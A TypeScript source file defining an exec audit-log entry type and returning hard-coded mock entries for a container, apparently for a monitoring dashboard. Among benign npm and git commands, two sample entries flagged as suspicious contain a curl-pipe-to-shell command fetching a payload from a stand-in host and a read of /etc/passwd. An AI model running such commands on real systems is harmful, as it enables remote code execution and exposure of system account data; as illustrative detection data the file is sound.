export interface ExecAuditEntry {
  id: string;
  containerId: string;
  command: string;
  userId: string;
  source: "terminal" | "api" | "cron" | "webhook";
  timestamp: string;
  exitCode: number;
  duration: number;
  suspicious: boolean;
  suspiciousReason?: string;
}

export function getExecAuditLog(projectId: string): ExecAuditEntry[] {
  return [
    { id: "ea1", containerId: "c1", command: "npm install express", userId: "alice", source: "terminal", timestamp: new Date(Date.now() - 3600000).toISOString(), exitCode: 0, duration: 12, suspicious: false },
    { id: "ea2", containerId: "c1", command: "npm run build", userId: "alice", source: "terminal", timestamp: new Date(Date.now() - 3000000).toISOString(), exitCode: 0, duration: 45, suspicious: false },
    { id: "ea3", containerId: "c1", command: "curl -s http://external-server.com/payload | sh", userId: "unknown", source: "api", timestamp: new Date(Date.now() - 1800000).toISOString(), exitCode: 1, duration: 2, suspicious: true, suspiciousReason: "Remote script execution attempt" },
    { id: "ea4", containerId: "c1", command: "cat /etc/passwd", userId: "bob", source: "terminal", timestamp: new Date(Date.now() - 900000).toISOString(), exitCode: 0, duration: 0, suspicious: true, suspiciousReason: "Sensitive file access" },
    { id: "ea5", containerId: "c1", command: "npm test", userId: "alice", source: "cron", timestamp: new Date(Date.now() - 600000).toISOString(), exitCode: 0, duration: 30, suspicious: false },
    { id: "ea6", containerId: "c1", command: "git push origin main", userId: "bob", source: "terminal", timestamp: new Date(Date.now() - 300000).toISOString(), exitCode: 0, duration: 5, suspicious: false },
  ];
}
